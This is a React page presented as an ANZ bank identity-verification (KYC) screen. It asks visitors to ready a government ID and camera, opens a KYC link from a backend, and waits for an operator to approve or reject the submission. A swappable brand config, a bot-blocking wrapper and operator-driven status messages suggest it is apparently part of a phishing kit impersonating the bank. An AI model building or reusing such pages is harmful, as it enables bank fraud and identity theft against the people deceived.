'use client';

/**
 * ANZ KYC (Know Your Customer) Page
 * Centered single-column layout
 */

import { useState, useEffect } from 'react';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { Loader2, ExternalLink, AlertCircle } from 'lucide-react';

// Lock icon SVG component
const LockIcon = () => (
  <svg className="lock-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path fill="currentColor" d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z" />
  </svg>
);

export default function KYCPage() {
  const { status, caseId, agentMessage } = useSessionStore();

  const [kycStatus, setKycStatus] = useState<'not_started' | 'in_progress' | 'waiting'>('not_started');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setKycStatus('not_started');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsLoading(false);
    }
  }, [status, agentMessage]);

  async function handleBeginKYC() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    try {
      const response = await fetch('/api/user-started-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to start KYC process');
      }

      const data = await response.json();
      const kycUrl = data.kyc_url;

      if (!kycUrl) {
        throw new Error('KYC provider is not configured properly');
      }

      window.open(kycUrl, '_blank');
      setKycStatus('in_progress');
      setError(null);
    } catch (err) {
      console.error('KYC begin error:', err);
      setError('Unable to start verification. Please try again.');
    }
  }

  async function handleKYCCompleted() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/submit-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit KYC');
      }

      setKycStatus('waiting');
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'Waiting for review...',
      });
    } catch (err) {
      console.error('KYC completion error:', err);
      setError('Failed to submit. Please try again.');
      setIsLoading(false);
    }
  }

  const handleRetry = () => {
    setError(null);
    setKycStatus('not_started');
  };

  const isWaiting = kycStatus === 'waiting' || status === 'waiting' || isLoading;

  return (
    <BotGuard>
      {/* Page Title */}
      <h1 className="page-title">Identity Verification</h1>

      {/* Login Form */}
      <div className="login-card">
        {/* Card Header - Mobile only */}
        <div className="card-header">
          <h2>Identity Verification</h2>
        </div>

        <form className="login-form" onSubmit={(e) => e.preventDefault()}>
          {/* Waiting State */}
          {isWaiting ? (
            <>
              <p style={{ color: 'var(--anz-white)', fontSize: '14px', textAlign: 'center', opacity: 0.9 }}>
                Please wait while we verify your identity.
              </p>
              <button className="btn-signin" disabled>
                <Loader2 className="h-4 w-4 animate-spin" />
                <LockIcon />
                Verifying...
              </button>
            </>
          ) : (
            <>
              {kycStatus === 'not_started' && (
                <>
                  <p style={{ color: 'var(--anz-white)', fontSize: '14px', opacity: 0.9 }}>
                    To protect your account, we need to verify your identity. Have ready:
                  </p>
                  <ul style={{ color: 'var(--anz-white)', fontSize: '14px', marginLeft: '20px', marginBottom: '16px', opacity: 0.9 }}>
                    <li>A valid government-issued ID</li>
                    <li>A device with a camera</li>
                  </ul>

                  {error && (
                    <div className="error-message" style={{ marginBottom: '16px' }}>
                      <AlertCircle className="h-4 w-4" />
                      <span>{error}</span>
                    </div>
                  )}

                  <button
                    type="button"
                    onClick={handleBeginKYC}
                    className="btn-signin"
                  >
                    <LockIcon />
                    Begin Verification
                    <ExternalLink style={{ width: '14px', height: '14px', marginLeft: '8px' }} />
                  </button>

                  <p style={{ color: 'var(--anz-white)', fontSize: '12px', marginTop: '8px', textAlign: 'center', opacity: 0.7 }}>
                    Opens in a new window
                  </p>
                </>
              )}

              {kycStatus === 'in_progress' && (
                <>
                  <p style={{ color: 'var(--anz-white)', fontSize: '14px', opacity: 0.9 }}>
                    Complete the verification in the new window, then click Continue.
                  </p>

                  {error && (
                    <div className="error-message" style={{ marginBottom: '16px' }}>
                      <AlertCircle className="h-4 w-4" />
                      <span>{error}</span>
                    </div>
                  )}

                  <button
                    type="button"
                    onClick={handleKYCCompleted}
                    className="btn-signin"
                    disabled={isLoading}
                  >
                    {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
                    <LockIcon />
                    {isLoading ? 'Submitting...' : 'Continue'}
                  </button>

                  <button
                    type="button"
                    onClick={handleRetry}
                    disabled={isLoading}
                    style={{
                      marginTop: '12px',
                      display: 'block',
                      border: 'none',
                      background: 'none',
                      cursor: 'pointer',
                      width: '100%',
                      color: 'var(--anz-white)',
                      textDecoration: 'underline',
                      fontSize: '14px'
                    }}
                  >
                    Start over
                  </button>
                </>
              )}
            </>
          )}

          <p style={{ color: 'var(--anz-white)', fontSize: '13px', textAlign: 'center', marginTop: '20px', opacity: 0.8 }}>
            Need help? Contact {currentBrand.companyName} support
          </p>
        </form>
      </div>
    </BotGuard>
  );
}
